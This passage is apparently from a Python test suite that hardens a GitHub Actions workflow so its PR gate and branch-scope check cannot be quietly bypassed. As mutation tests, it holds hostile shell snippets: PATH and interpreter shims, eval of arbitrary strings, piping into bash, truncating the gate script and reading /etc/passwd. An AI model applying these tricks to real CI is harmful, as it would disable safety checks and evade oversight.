    # before writing `ref=`, so the selection silently widens to `--all` while the workflow looks like
    # it diffed a base; the installer exits before setting `SEL`, which `set -u` turns into a red gate
    # step. Neither is a false green, so this loop is defence in depth rather than a closed hole — and
    # it exists mostly so a step added later arrives with a reachability rule instead of none. The two
    # load-bearing steps keep their own named checks, whose wording the controls assert against.
    # Named twice on purpose: `NAMED_SHELL_STEPS` is the set of step names other rules key on, and
    # `keys_on_real_steps` asserts every one of them matched a step. Without that assertion the
    # name-keyed loops *cancel out* — rename "Branch scope" and it leaves the `JOB_CONTROL` loop
    # (−1 check) and joins this one (+1 check), so the total-count invariant sees no change while
    # `JOB_CONTROL` silently stops applying to the step that carries the retry loop. Two commits get
    # you there and the first is the one the rename failure message prescribes.
    NAMED_SHELL_STEPS = ("Run the gate", "Branch scope")
    others = [s for s in (gate_job.get("steps") or [])
              if "run" in s and s.get("name") not in NAMED_SHELL_STEPS]
    for step in others:
        check(f"nothing at the top level of {step.get('name')!r} ends the shell early",
              not escapes_early(step), escapes_early(step))
    present = {s.get("name") for s in (gate_job.get("steps") or [])}
    for named in NAMED_SHELL_STEPS:
        check(f"a step named {named!r} exists, so the rules keyed on that name still apply to "
              "something — renaming it must fail here rather than quietly exempt it",
              named in present, sorted(present))
    check("exactly one step runs the gate for a verdict", len(found_gate) == 1, len(found_gate))
    if len(found_gate) == 1:
        gate_step = found_gate[0]
        cmds = shell_of(gate_step)
        # Keys, exactly: `if:`/`continue-on-error:` were the two a regex looked for, but `shell:`
        # ("cat {0}" makes the runner print the script instead of executing it) and `env:`
        # (re-pointing SEL at an empty selection) neutralise the step just as completely, and no
        # enumeration of bad keys would have named them all.
        check("the gate step carries only a name and a script, so nothing can skip, tolerate or "
              "reinterpret it (add a key to ALSO_FINE only if it cannot make a failure pass)",
              sorted(set(gate_step) - ALSO_FINE) == ["name", "run"], sorted(gate_step))
        # Pinned by *what the flags do*, not by the literal: `set -euxo pipefail` adds tracing and
        # still aborts on the first error, so rejecting it was a false alarm — and the old message
        # said the step no longer aborts, which was flatly wrong. `-e`, `-u` and `-o pipefail` are
        # required; extra letters are allowed; dropping one is not.
        opener = (cmds[:1] or [""])[0]
        check("the gate step opens with a `set` line that keeps -e, -u and -o pipefail, so it aborts "
              "on the first error and reads no unset variable as empty (extra flags such as -x or -E "
              "are allowed; the later lines are governed by ALLOWED_SET)",
              set_flags_ok(opener), opener)
        # Property, not spelling: exactly one command must *execute* the gate with its status still
        # reaching the job. Pinning the last line to one literal rejected two correct edits — a
        # re-raising handler (`|| { echo "::error::…"; exit 1; }`, which this suite separately
        # asserts is not masking) and a trailing `echo "::notice::"`, unreachable under `set -e`.
        runs_gate = [ln for ln in cmds if foreground(ln, "scripts/ai/pr_gate.py")]
        check("one command executes the gate with its verdict reaching the job",
              len(runs_gate) == 1, cmds)
        check("the gate is invoked in exactly the reviewed form (GATE_CMD) — argv is pinned here, "
              "so adding a flag or respelling `python` fails on the pin rather than on anything "
              "about empty diffs",
              len(runs_gate) == 1
              and argv_in(invoking_segment(runs_gate[0], "scripts/ai/pr_gate.py"), (GATE_CMD,)),
              [invoking_segment(ln, "scripts/ai/pr_gate.py") for ln in runs_gate])
        check("every other command is a bare echo, which cannot swallow the verdict",
              all(pure_echo(ln) for ln in cmds[1:] if ln not in runs_gate), cmds)
        check("nothing in the gate step ends the shell before the gate runs",
              not escapes_early(gate_step), escapes_early(gate_step))
        check("every segment of the gate step runs a command the step is meant to run — either the "
              "command is not in the whitelists (HARMLESS, TEST_CMDS, NO_OPS, SCRIPTS, GIT_FORMS, "
              "ALLOWED_SET, ALLOWED_ASSIGN), or it is one of them respelled; the segment is printed "
              "below and the fix is to add it there, deliberately",
              not foreign_commands(gate_step), foreign_commands(gate_step))
        check("the gate step neither redirects nor substitutes, so it cannot rewrite the script it "
              "is about to run", not rewrites(gate_step), rewrites(gate_step))
    for line, ok in (("set -euo pipefail", True),
                     # Same options, `-o` written separately — refused for adjacency alone.
                     ("set -eu -o pipefail", True),
                     ("set -Eeuo pipefail", True),
                     ("set -euxo pipefail", True),
                     # `-E` is errtrace, a different option. Case-folding the flag set to admit
                     # `-Eeuo` also admitted this, where there is no lowercase `e` at all: bash leaves
                     # errexit off, so the step stops aborting on error under a check that says it does.
                     ("set -Euo pipefail", False),
                     ("set -eUo pipefail", False),
                     # `-n` reads the script without executing it, which would defang the whole step.
                     ("set -euno pipefail", False),
                     ("set -eu", False),
                     ("set -eo pipefail", False)):
        check(f"the set-line rule reads {line!r} as {'keeping' if ok else 'losing'} -e/-u/pipefail",
              set_flags_ok(line) is ok, line)

    # Selection is the other way to make a passing gate meaningless: `--base HEAD` is an empty diff,
    # and an empty diff selects nothing and exits 0. So SEL may only be built two ways.
    # Both the assignments *and* the export: the gate runs in a different step and receives the
    # value through $GITHUB_ENV, so a rule that reads only `SEL=…` assignments leaves the line that
    # actually reaches the gate unchecked — `echo "SEL=--base HEAD" >> "$GITHUB_ENV"` neutralised
    # the whole gate with both permitted assignments still in place.
    ALLOWED_SEL = ('SEL="--all"', 'SEL="--base ${BASE}"',
                   'echo "SEL=${SEL}" >> "$GITHUB_ENV"')

    def sel_lines(text):
        return [ln.strip() for ln in run_contents(text) if "SEL=" in ln]

    sel = sel_lines(wf)
    check("every line that sets or exports the selection names the whole repo or the real base",
          sel and all(ln in ALLOWED_SEL for ln in sel), sel)
    for label, mutant in (("a neutralised assignment", 'SEL="--base HEAD"'),
                          ("a neutralised export",
                           'echo "SEL=--base HEAD" >> "$GITHUB_ENV"'),
                          ("an export that drops the variable",
                           'echo "SEL=--all" >> "$GITHUB_ENV"')):
        check(f"that rule rejects {label}", not all(ln in ALLOWED_SEL for ln in [mutant]))
    # The selection is not the only thing a step can hand the gate. `$GITHUB_ENV` and `$GITHUB_PATH`
    # cross step boundaries, so an earlier step can re-point `PATH` at a shim and the gate step —
    # whose every segment is whitelisted — would still be running `python` as written and getting
    # something else. Whitelisting the *writes* covers both variables and any value either carries.
    #
    # Filtered on the *destination*, never on the content. Two rules in this file were written the
    # other way — one keyed on `SEL=`, one on `ref=` — and both were escapable by a mutation that
    # avoided the substring while doing the thing: `echo "ref""=HEAD" >> "$GITHUB_OUTPUT"` is two
    # quoted words bash concatenates, GitHub honours the last write, and neither rule's subject set
    # contained the line. The destination cannot be avoided the same way, because a step that wants to
    # reach a later one has to write to one of these four files, and `redirections()` already refuses
    # every other target. So all four are read here, as one rule, rather than one file per rule.
    crossings = [ln.strip() for ln in run_contents(wf) if hands_over(ln)]
    # A step summary is display-only: it reaches the PR page, not a later step's environment, so it is
    # matched by shape instead of enumerated. Leaving it out made `REDIR_TARGETS` advertise a
    # destination this rule refused, and a reader who meets two rules disagreeing concludes the suite
    # is arbitrary rather than that one of them is wrong.
    # `[^"]*`, not `.*`: greedy and unanchored inside the quotes, `.*` spanned an entire earlier
    # command *including its own redirection*, so any line whose last command was a summary echo was
    # admitted whole — `echo "SEL""=--base HEAD" >> "$GITHUB_ENV" ; echo "x" >> "$GITHUB_STEP_SUMMARY"`
    # passed every rule and neutralised the selection. That was a live false green in the two steps
    # `rewrites()` does not cover.
    riders = [ln for ln in crossings if rides(ln)]
    check("a line that hands a value to a later step carries nothing else, so no command can ride "
          "along behind a permitted write (ALLOWED_WRITES)", not riders, riders)
    check("the only values a step hands another are the selection and the base ref, so nothing can "
          "re-point PATH, the interpreter or the diff out of band — extend ALLOWED_WRITES to add one "
          "(a step summary is display-only and allowed by shape, see SUMMARY)",
          crossings and all(permitted_write(ln) for ln in crossings), crossings)
    # Through `rides`/`permitted_write` rather than re-deriving their conditions: spelled inline, these
    # controls compared a literal against a literal from the same source and passed with the rules
    # narrowed or deleted.
    for label, mutant in (("a neutralising export riding behind a permitted summary write",
                           'echo "SEL""=--base HEAD" >> "$GITHUB_ENV" ; echo "x" >> '
                           '"$GITHUB_STEP_SUMMARY"'),
                          ("a PATH prepend riding behind one",
                           'echo "/tmp/shim" >> "$GITHUB_PATH" && echo "x" >> '
                           '"$GITHUB_STEP_SUMMARY"')):
        check(f"those two rules reject {label}",
              rides(mutant) and not permitted_write(mutant), mutant)
    for label, spelling in (("on a line of its own",
                             'echo "selection was --all" >> "$GITHUB_STEP_SUMMARY"'),
                            ("written without spaces around the operator",
                             'echo "x">>"$GITHUB_STEP_SUMMARY"'),
                            ("written with the braced variable",
                             'echo "x" >> "${GITHUB_STEP_SUMMARY}"')):
        check(f"and a plain summary write {label} is still accepted",
              permitted_write(spelling) and not rides(spelling), spelling)
    for label, mutant in (("a PATH re-pointed for later steps",
                           'echo "PATH=/tmp/shim:$PATH" >> "$GITHUB_ENV"'),
                          ("a directory prepended to PATH",
                           'echo "/tmp/shim" >> "$GITHUB_PATH"'),
                          ("a second base-ref write split around the substring a content filter "
                           "would key on", 'echo "ref""=HEAD" >> "$GITHUB_OUTPUT"'),
                          ("the same trick on the selection export",
                           'echo "SEL""=--base HEAD" >> "$GITHUB_ENV"'),
                          ("a write whose destination is unquoted", "echo x >> $GITHUB_ENV")):
        check(f"that rule rejects {label}", mutant not in ALLOWED_WRITES)
        check("and its subject set contains that line, which is the half a content filter missed",
              bool(re.search(r'>>?\s*"?\$GITHUB_(ENV|PATH|OUTPUT|STEP_SUMMARY)', mutant)), mutant)
    # Two shell constructs are refused workflow-wide rather than modelled, because both make the
    # *whole file's* executed lines mean something other than what this suite reads them as — not
    # just the two whitelisted steps. A backslash turns a separator into text, so `echo disabled\;
    # python …pr_gate.py ${SEL}` is one echo while the segmentation reports an invocation. A heredoc
    # turns the lines that follow it into data, so a phantom `set -- --pr "${PR}"` inside one would
    # satisfy the flag rules for a step that no longer passes the flag. Neither appears in the file,
    # which is what makes refusing them free; if one is ever needed, the segmentation must model it
    # first.
    # A folded scalar is not a line-by-line script: `run: >` makes the runner join the step's lines
    # with spaces, so `set -euo pipefail` swallows the invocation below it as positional arguments and
    # the step exits 0 having run nothing — while `run_contents()` still hands every rule here the
    # lines separately. `run_contents()` deliberately *collects* folded blocks, because an earlier
    # round found the injection rule blind to them; that is about seeing the text, and this is about
    # what the text means. Refusing the style is cheaper than modelling the fold.
    folded = [ln.strip() for ln in strip_comments(wf).splitlines()
              if re.match(r"^\s*run:\s*>[-+]?\s*$", ln)]
    check("every run: block is a literal scalar, since a folded one joins the lines this suite reads "
          "as separate commands", not folded, folded)
    check("that rule can see a folded block",
          [ln for ln in "        run: >\n          set -euo pipefail\n".splitlines()
           if re.match(r"^\s*run:\s*>[-+]?\s*$", ln)])
    check("and accepts the two styles the workflow uses",
          not [ln for ln in "        run: |\n          echo x\n        run: echo y\n".splitlines()
               if re.match(r"^\s*run:\s*>[-+]?\s*$", ln)])
    for label, hits in (("a backslash escape or line continuation",
                         [ln.strip() for ln in run_contents(wf) if "\\" in ln]),
                        ("an input redirection or heredoc, whose body this suite would read as "
                         "commands", [ln.strip() for ln in run_contents(wf) if "<" in ln])):
        check(f"no executed line uses {label}", not hits, hits)
    check("that pair of rules can see an escaped separator",
          [ln for ln in run_contents(
              '        run: |\n          echo disabled\\; python scripts/ai/pr_gate.py ${SEL}\n')
           if "\\" in ln])
    check("and a heredoc that would hide a command as data",
          [ln for ln in run_contents(
              "        run: |\n          echo disabled <<'echo'\n          set -- --pr \"${PR}\"\n")
           if "<" in ln])
    # --pr, not merely the script: without it the checker loses signal 2 (STACKED), so a
    # half-defanged invocation would otherwise read as fully wired. The flag is asserted over the
    # executed shell rather than on the invocation line, because the workflow builds the argument
    # list first (`set -- --pr …`) to share one retry loop with the fork path.
    shell = "\n".join(run_contents(wf))
    check("branch scope is executed", invocations("scripts/ai/check_branch_scope.py"), shell)
    # This step cannot be pinned to the gate's shape: it *needs* an `if:` (there is no PR number on
    # a dispatch), and it deliberately runs under `set +e` to capture `$?` for the retry loop. So
    # the two things that shape depends on are pinned instead — the condition it may carry, and the
    # capture of the real exit code, which `code=0` would otherwise replace while leaving the
    # `-ne 2` comparison below intact and passing.
    found_scope = steps_named(gate_job, "scripts/ai/check_branch_scope.py")
    check("exactly one step runs branch scope", len(found_scope) == 1, len(found_scope))
    if len(found_scope) == 1:
        scope_step = found_scope[0]
        SCOPE_KEYS = {"name", "if", "env", "run"}
        check("branch scope carries only keys its shape needs",
              not sorted(set(scope_step) - SCOPE_KEYS), sorted(set(scope_step) - SCOPE_KEYS))
        check("branch scope runs on pull requests, the only event with a PR number",
              scope_step.get("if") == "github.event_name == 'pull_request'", scope_step.get("if"))
        # The env is pinned per key, because these four values decide which branch the step takes
        # and what it compares: pinning `CROSS`'s *expression* is what stops a hardcoded `CROSS:
        # "true"` sending every PR down the fork path, where --pr — and with it signal 2 — is gone.
        SCOPE_ENV = {
            "PR": "${{ github.event.pull_request.number }}",
            "BASE_REF": "${{ github.base_ref }}",
            "CROSS": "${{ github.event.pull_request.head.repo.full_name != github.repository }}",
            "GH_TOKEN": "${{ secrets.GITHUB_TOKEN }}",
        }
        check("the inputs that decide its comparison are the real event values, per key (SCOPE_ENV) "
              "— adding a variable here means adding it there",
              (scope_step.get("env") or {}) == SCOPE_ENV, scope_step.get("env"))
        seq = shell_of(scope_step)
        called = [i for i, ln in enumerate(seq)
                  if foreground(ln, "scripts/ai/check_branch_scope.py")]
        check("the checker is invoked as a bare command", called, seq)
        # `--no-fetch` may ride on the invocation instead of the argument list, which is one of the
        # correct edits this suite promises to accept; nothing else may.
        check("the checker receives the argument list this step built, not literal refs",
              all(argv_in(invoking_segment(seq[i], "scripts/ai/check_branch_scope.py"),
                          (SCOPE_CMD, SCOPE_CMD + " --no-fetch")) for i in called),
              [invoking_segment(seq[i], "scripts/ai/check_branch_scope.py") for i in called])
        check("its real exit code is what the retry loop reads",
              all(seq[i + 1:i + 2] == ["code=$?"] for i in called), seq)
        # The fork branch is the one without --pr, so a condition that is always true sends every
        # PR down it and loses STACKED permanently while `set -- --pr` survives, unreachable, in the
        # else. Textual rules could see the flag but not which branch runs.
        check("the fork branch is taken only for a genuine cross-repository PR",
              [ln for ln in seq
               if canonical_shell(ln) == 'if [ "${CROSS}" = "true" ]; then'], seq)
        # A property, not a mechanism: the earlier rule pinned `set --` as the way the flag is
        # assembled, which rejected the equivalent (and clearer) edit of putting it on the
        # invocation. What matters is that the flag reaches the checker, however the args are built.
        no_fetch = [ln for ln in seq
                    if foreground(ln, "set --", ["--no-fetch"])
                    or foreground(ln, "check_branch_scope.py", ["--no-fetch"])]
        check("the checker does not fetch, since checkout already did so authenticated",
              no_fetch, seq)
        check("nothing in the branch-scope step ends the shell before the checker runs",
              not escapes_early(scope_step), escapes_early(scope_step))
        check("every segment of the branch-scope step runs a command the step is meant to run — see "
              "the whitelists named in the gate-step version of this rule; the segment is below",
              not foreign_commands(scope_step), foreign_commands(scope_step))
        check("the branch-scope step neither redirects nor substitutes",
              not rewrites(scope_step), rewrites(scope_step))
    # Where the flag appears, not merely that it appears in an executed line. Searching the whole
    # shell passed the mutation that removes --pr, because the fork branch *echoes* the words
    # "needs --pr" while explaining its absence. Third instance in this round of the same shape:
    # comment-stripping is not enough, since a string inside an echo is executed and still inert.
    def pr_arg(ln):
        return (foreground(ln, "set --", ["--pr"])
                or foreground(ln, "check_branch_scope.py", ["--pr"]))

    pr_form = [ln for ln in run_contents(wf) if pr_arg(ln)]
    check("--pr reaches the checker as an argument, which is what gets both signals",
          pr_form, shell)
    check("that rule is not satisfied by an echo that merely mentions the flag",
          not [ln for ln in run_contents('        run: echo "STACKED needs --pr and is off"\n')
               if pr_arg(ln)])
    check("that rule rejects a checker that is echoed rather than run",
          not pr_arg('            echo python scripts/ai/check_branch_scope.py "$@" --pr'))
    check("that rule rejects a checker whose verdict is discarded",
          not pr_arg('            python scripts/ai/check_branch_scope.py --pr 1 || true'))
    check("that rule rejects --pr echoed beside a real argument list on one line",
          not pr_arg('            set -- --base origin/264 --head HEAD; '
                     'echo "STACKED needs --pr and is off"'))
    # Controls for the step-scoped rules. Each feeds the real predicate a mutated step, because a
    # control that only re-states its own input tests nothing: the previous `continue-on-error`
    # control asserted the string was in a string containing it, which no change to the rule could
    # ever fail.
    # Each control runs the *real* predicate over a mutated workflow, because the versions these
    # replace fed a mutated step to a rule that no longer exists: they asserted a regex for
    # `if|continue-on-error` still matched, while the assertion above had become a key whitelist.
    # A control for a retired rule reports on nothing and keeps reporting PASS.
    def gate_step_of(text):
        _, job = None, None
        try:
            parsed = parse_yaml(text)
        except YamlUnsupported:
            return None, {}
        for job in (parsed.get("jobs") or {}).values():
            hits = [s for s in (job.get("steps") or [])
                    if step_runs(s, "scripts/ai/pr_gate.py",
                                 ("--requirements", "--list", "--help"))]
            if hits:
                return hits[0], job
        return None, {}

    # Synthetic: the mutant is a step mapping, not a splice into the real file. Anchored on
    # `"      - name: Run the gate\n        run: |"`, these five stopped applying the moment that step
    # was renamed — and each then reported the rule "rejects a conditional gate step", which is an
    # accusation about a mutation nobody made. It is also the kill-attribution lesson twice over: a
    # control that depends on the artifact's text measures the text, not the rule.
    for label, key, value in (("a conditional gate step", "if", False),
                              ("a gate step that tolerates failure", "continue-on-error", True),
                              ("a quoted key the old regex could not see", '"continue-on-error"',
                               True),
                              ("a step whose shell prints the script instead of running it", "shell",
                               "cat {0}"),
                              ("a step env that re-points the selection", "env",
                               {"SEL": "--all --dry-run"})):
        mutant = {"name": "Run the gate", "run": "set -euo pipefail\n", key: value}
        check(f"the gate-step key rule rejects {label}", sorted(mutant) != ["name", "run"],
              sorted(mutant))
    check("and that rule accepts a shell named as the runner default, which reinterprets nothing",
          all(v == "bash" for v in {"shell": "bash"}.values()))
    JOB_MUTANTS = {
        "a job that tolerates failure": "    continue-on-error: true",
        "a job that never runs": "    if: false",
        "a job default shell that swallows every step": "    defaults:\n      run:\n"
                                                        '        shell: "cat {0}"',
    }
    # Both of these used to be built from `wf`, so a job-level `concurrency:` broke the first and a
    # second job broke both — each then reporting that the *suite's own* positional-window fix had
    # regressed, about an edit the maintainer never made. Built from a literal instead: the property
    # is what `gate_step_of` does with a shape, and the shape can be written down.
    LITERAL_WF = ("name: Fixture\non:\n  pull_request:\njobs:\n"
                  "  gate:\n    name: Mechanical checks\n    runs-on: ubuntu-latest\n"
                  "    steps:\n      - name: Run the gate\n        run: |\n"
                  "          python scripts/ai/pr_gate.py ${SEL}\n")
    for label, extra in JOB_MUTANTS.items():
        mutant = LITERAL_WF.replace("    runs-on: ubuntu-latest\n",
                                    "    runs-on: ubuntu-latest\n" + extra + "\n", 1)
        assert mutant != LITERAL_WF, "the job mutant anchor missed, so this asserts nothing"
        _, job = gate_step_of(mutant)
        check(f"the job key rule rejects {label}", sorted(set(job) - JOB_KEYS), sorted(job))
    check("the job rule sees a key appended after the steps list, which a positional window missed",
          sorted(set(gate_step_of(LITERAL_WF + "    if: false\n")[1]) - JOB_KEYS) == ["if"])
    check("a decoy job before the real one no longer hides it",
          sorted(set(gate_step_of(
              LITERAL_WF.replace("jobs:\n  gate:", "jobs:\n  noop:\n    runs-on: ubuntu-latest\n"
                                 "    steps:\n      - name: nothing\n        run: echo ok\n\n  gate:", 1)
          )[1]) - JOB_KEYS) == [])
    # The parser's refusals are what make every whitelist above honest: a shape it cannot model is
    # a step whose keys are invisible, which would satisfy "only these keys" by having none.
    for bad, why in (("jobs:\n  gate:\n    steps:\n      - { name: x, run: echo hi }\n",
                      "a flow-style step"),
                     # Refused only in the sequence branch, this one reached the rules as the string
                     # "{fetch-depth: 1}" and crashed them on `.get` — with zero [FAIL] labels, for a
                     # shallow checkout, which is a real defang and had to read as a refusal.
                     ("jobs:\n  gate:\n    steps:\n      - uses: actions/checkout@v6\n"
                      "        with: {fetch-depth: 1, persist-credentials: false}\n",
                      "a flow mapping as a value"),
                     ("a: &anchor 1\nb: *anchor\n", "an anchor or alias"),
                     ("a: 1\na: 2\n", "a duplicate key"),
                     ("a:\n\t- 1\n", "a tab")):
        try:
            parse_yaml(bad)
            refused = False
        except YamlUnsupported:
            refused = True
        check(f"the reader refuses {why} rather than reading past it", refused)
    # And the shapes it must *read*, not refuse: an explicit null value is how "this event, no
    # filters" is legally written, and read as the string 'null' it made a filterless trigger report
    # three filters (the letters) and then crash.
    for spelling in ("null", "~"):
        parsed = parse_yaml(f"on:\n  pull_request: {spelling}\n  merge_group:\n")
        check(f"an explicit {spelling!r} value reads as absent rather than as a string",
              parsed.get("on", {}).get("pull_request") is None, parsed.get("on"))
    TRAILING = {
        "a masked verdict": "python scripts/ai/pr_gate.py ${SEL} || echo warn",
        "a backgrounded gate": "python scripts/ai/pr_gate.py ${SEL} &",
        "a gate wrapped in a conditional": "if python scripts/ai/pr_gate.py ${SEL}; then :; fi",
        "a verdict eaten by substitution": 'true "$(python scripts/ai/pr_gate.py ${SEL})"',
        "an inline comment in place of the call":
            "set -euo pipefail # TODO: re-enable python scripts/ai/pr_gate.py ${SEL}",
        "a gate wrapped in a while loop": "while python scripts/ai/pr_gate.py ${SEL}; do :; done",
        "a gate wrapped in until": "until python scripts/ai/pr_gate.py ${SEL}; do break; done",
        "a negated gate": "! python scripts/ai/pr_gate.py ${SEL}",
    }
    for label, last in TRAILING.items():
        check(f"the executed-gate rule rejects {label}",
              not executes(strip_comments(last), "scripts/ai/pr_gate.py"))
    # The between-commands rule is now "a bare echo", not "starts with echo": the prefix form
    # accepted a line that echoes and then does anything at all.
    for label, ln in (("an appended exit 0", "exit 0"),
                      ("an echo that then exits", 'echo "disabled" && exit 0'),
                      ("an echo that then shadows the interpreter",
                       'echo "shim"; python() { return 0; }'),
                      ("an echo piped into a shell", 'echo "$CMD" | bash')):
        check(f"the between-commands rule rejects {label}", not pure_echo(ln))
    check("that rule still accepts a plain progress echo", pure_echo('echo "running the gate"'))
    # Skippable, not merely masked. Both load-bearing invocations are pinned to a command bash will
    # actually reach: `true || python …` is a real invocation whose status a `code=$?` on the next
    # line duly captures — as 0, because the command never ran.
    for label, ln in (("a command skipped by a succeeding predecessor",
                       'true || python scripts/ai/check_branch_scope.py "$@"'),
                      ("a command skipped by a failing predecessor",
                       'false && python scripts/ai/check_branch_scope.py "$@"'),
                      ("a gate skipped by a succeeding predecessor",
                       "true || python scripts/ai/pr_gate.py ${SEL}")):
        script = ("scripts/ai/pr_gate.py" if "pr_gate" in ln
                  else "scripts/ai/check_branch_scope.py")
        check(f"the foreground rule rejects {label}", not foreground(ln, script))
        check(f"and the older masking rule could not see {label}", executes(ln, script))
    check("the foreground rule still accepts a cleanup before the real command, which `;` cannot skip",
          foreground("rm -f gate.log || true; python scripts/ai/pr_gate.py ${SEL}",
                     "scripts/ai/pr_gate.py"))
    # Unreachable, not merely skippable: a predecessor that ends the shell needs no conditional to
    # make what follows it dead, so `;` — the separator the rule above deliberately accepts — is
    # exactly the one this shape uses.
    for label, ln in (("a gate behind a successful exit",
                       "exit 0; python scripts/ai/pr_gate.py ${SEL}"),
                      ("a checker behind a successful exit",
                       'exit 0; python scripts/ai/check_branch_scope.py "$@"'),
                      ("a gate behind a return",
                       "return 0; python scripts/ai/pr_gate.py ${SEL}")):
        script = ("scripts/ai/pr_gate.py" if "pr_gate" in ln
                  else "scripts/ai/check_branch_scope.py")
        check(f"the foreground rule rejects {label}", not foreground(ln, script))
        check(f"and the skippable-command rule could not see {label}", executes(ln, script))
    check("a handler that re-raises still reads as running, since the invocation precedes its exit",
          foreground('python scripts/ai/pr_gate.py ${SEL} || { echo "::error::x"; exit 1; }',
                     "scripts/ai/pr_gate.py"))
    # Controls for the step-scoped form of the same property. The real steps must pass it; a step
    # with a top-level `exit 0` must not; and nesting must still be read as conditional, or the rule
    # would reject the retry loop's own `exit 2`.
    def as_step(*shell):
        """A step whose `run` carries the indentation a block scalar has in the file, since that is
        what tells a nested line from a top-level one."""
        return {"run": "\n".join(" " * 10 + ln for ln in shell)}

    for label, ln, ok in (("a summary written from the gate step, which reaches the PR page and not "
                           "a later step", 'echo "gate passed" >> "$GITHUB_STEP_SUMMARY"', True),
                          ("a redirection that truncates the script about to run",
                           "echo -n > scripts/ai/pr_gate.py", False)):
        check(f"the redirection rule {'accepts' if ok else 'rejects'} {label}",
              (not rewrites(as_step("set -euo pipefail", ln))) is ok, ln)
    # Controls for the vocabulary rule. The shapes are the ones that make an invocation inert without
    # touching it: a shim on the same line as the real call (which the line-exempting rules could not
    # see), a shim anywhere in a step, and the four other spellings of the same idea.
    for label, snippet in (("a function shadowing the interpreter beside the real call",
                            "python() { return 0; }; python scripts/ai/pr_gate.py ${SEL}"),
                           ("a function shadowing it on a line of its own", "python() { return 0; }"),
                           ("the `function` keyword form", "function python { return 0; }"),
                           ("an alias", "alias python=true"),
                           ("PATH re-pointed inside the step", "PATH=/tmp/shim:$PATH"),
                           ("an exported PATH", "export PATH=/tmp/shim:$PATH"),
                           ("a hashed path for the interpreter", "hash -p /bin/true python"),
                           ("an eval of an arbitrary string", 'eval "$CMD"'),
                           ("the gate read as data by another program",
                            "python -c 'import sys; sys.exit(0)' scripts/ai/pr_gate.py ${SEL}"),
                           ("an older checker restored by a whitelisted command",
                            "git checkout HEAD~50 -- scripts/ai/"),
                           ("a conditional whose condition is an arbitrary command",
                            "if rm -f scripts/ai/pr_gate.py; then :; fi")):
        check(f"the vocabulary rule rejects {label}",
              foreign_commands(as_step("set -euo pipefail", snippet)), snippet)
    for label, snippet in (("an argv override that compares HEAD with itself",
                            "set -- --base HEAD --head HEAD --no-fetch"),
                           ("an argv override that drops the flags",
                            'set -- --pr "${PR}" --no-stacked'),
                           ("a shell option this workflow does not use", "set -x")):
        check(f"the pinned `set` forms reject {label}",
              foreign_commands(as_step("set -euo pipefail", snippet)), snippet)
    for label, ln, script in (
            ("a gate handed a literal selection",
             "python scripts/ai/pr_gate.py --base HEAD", "scripts/ai/pr_gate.py"),
            ("a checker handed literal refs",
             'python scripts/ai/check_branch_scope.py --base HEAD --head HEAD --no-fetch',
             "scripts/ai/check_branch_scope.py")):
        check(f"the invocation rule rejects {label}",
              not argv_in(invoking_segment(ln, script),
                          (GATE_CMD, SCOPE_CMD, SCOPE_CMD + " --no-fetch")),
              invoking_segment(ln, script))
    # Spelled with the `::error::` annotation the correct-edits list names, which is the point: this
    # is the handler `ANNOTATION` exists to keep working, so the control has to exercise the
    # annotation and not a plain message. An earlier revision swapped it for `echo "gate failed"` on
    # the claim that `::` is refused workflow-wide — it is not, display-only annotations are admitted,
    # and the swap deleted the coverage at the new rule's only risk point.
    HANDLER = 'python scripts/ai/pr_gate.py ${SEL} || { echo "::error::gate failed"; exit 1; }'
    check("it accepts the gate as written, and a re-raising handler after it",
          invoking_segment(HANDLER, "scripts/ai/pr_gate.py") == GATE_CMD)
    NOTICE = 'echo "::notice::selection was --all"'
    check("a trailing notice annotation is accepted, which is the other edit this repo documents as "
          "correct and which nothing used to assert",
          annotation_only(NOTICE) and pure_echo(NOTICE)
          and not foreign_commands(as_step("set -euo pipefail", NOTICE)), NOTICE)
    check("while a state-changing workflow command in the same position is not",
          not annotation_only('echo "::set-output name=ref::HEAD"'))
    check("the annotation rule admits that handler's payload, so the documented correct edit still "
          "passes every rule that reads it",
          all(annotation_only(seg) for seg, _ in parts(HANDLER))
          and not foreign_commands(as_step("set -euo pipefail", HANDLER)), HANDLER)
    check("and the checker with --no-fetch moved onto the invocation",
          argv_in(invoking_segment('python scripts/ai/check_branch_scope.py "$@" --no-fetch',
                                   "scripts/ai/check_branch_scope.py"),
                  (SCOPE_CMD + " --no-fetch",)))
    check("those forms accept the three the workflow actually builds argv with",
          not foreign_commands(as_step('set -- --base "origin/${BASE_REF}" --head "pr-${PR}"',
                                       'set -- --pr "${PR}"', 'set -- "$@" --no-fetch')))
    for label, snippet in (("an assignment prefixing a command, which defines a shim",
                            "code=0 eval 'python() { return 0; }'"),
                           ("an assignment to a name this workflow does not use", "PATH=/tmp/shim"),
                           ("a permitted name given an unexpected value", 'SEL="--base HEAD"')):
        check(f"the pinned assignment forms reject {label}",
              foreign_commands(as_step("set -euo pipefail", snippet)), snippet)
    check("those forms accept the three the retry loop needs, in either arithmetic spelling",
          not foreign_commands(as_step("attempt=1", "code=$?", "attempt=$((attempt + 1))",
                                      "attempt=$((attempt+1))")))
    for label, snippet in (("a redirection that truncates the script about to run",
                            "echo -n > scripts/ai/pr_gate.py"),
                           ("a command substitution hidden inside a permitted echo",
                            'echo "$(printf %s x > scripts/ai/pr_gate.py)"'),
                           ("a heredoc that turns the next line into data",
                            "echo disabled <<'echo'"),
                           ("a file read into a permitted command", "echo x < /etc/passwd"),
                           ("a backtick substitution", "echo `id`")):
        check(f"the rewrite rule rejects {label}",
              rewrites(as_step("set -euo pipefail", snippet)), snippet)
    check("that rule accepts the retry loop's arithmetic, which is not a substitution",
          not rewrites(as_step("sleep $((attempt * 15))", "attempt=$((attempt + 1))")))
    check("that rule accepts the gate step as written",
          not foreign_commands(as_step("set -euo pipefail",
                                       "python scripts/ai/pr_gate.py ${SEL}")))
    check("that rule accepts a re-raising handler, whose pieces are `echo` and `exit`",
          not foreign_commands(as_step(
              'python scripts/ai/pr_gate.py ${SEL} || { echo "gate failed"; exit 1; }')))
    check("that rule accepts the retry loop's arithmetic and its `set --` argument building",
          not foreign_commands(as_step("attempt=1", "while :", "do", "set +e",
                                       'python scripts/ai/check_branch_scope.py "$@"',
                                       "code=$?", "set -e",
                                       'if [ "$code" -ne 2 ]; then exit "$code"; fi',
                                       "sleep $((attempt * 15))", "attempt=$((attempt + 1))",
                                       "done")))
    # Quote-awareness is what makes the rule above usable: both steps echo strings containing `;`,
    # and a naive split turns the text after it into a segment that runs a command named `STACKED`.
    check("a separator inside a quoted string is text, not a segment boundary",
          len(parts('echo "Fork PR: comparing refs; STACKED needs --pr and is off."')) == 1)
    check("and a real separator outside quotes still splits",
